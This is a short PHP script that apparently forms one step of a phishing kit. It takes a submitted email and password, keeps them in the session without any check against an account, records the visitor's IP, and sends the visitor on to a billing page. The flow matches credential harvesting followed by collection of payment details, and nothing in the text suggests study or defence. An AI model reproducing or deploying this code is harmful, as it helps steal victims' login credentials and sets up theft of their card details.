<?php
session_start();
$ip = getenv("REMOTE_ADDR");

$_SESSION['email'] = $_POST['email'];
$_SESSION['password'] = $_POST['password'];

header("Location: billing.php?ip=$ip");
?>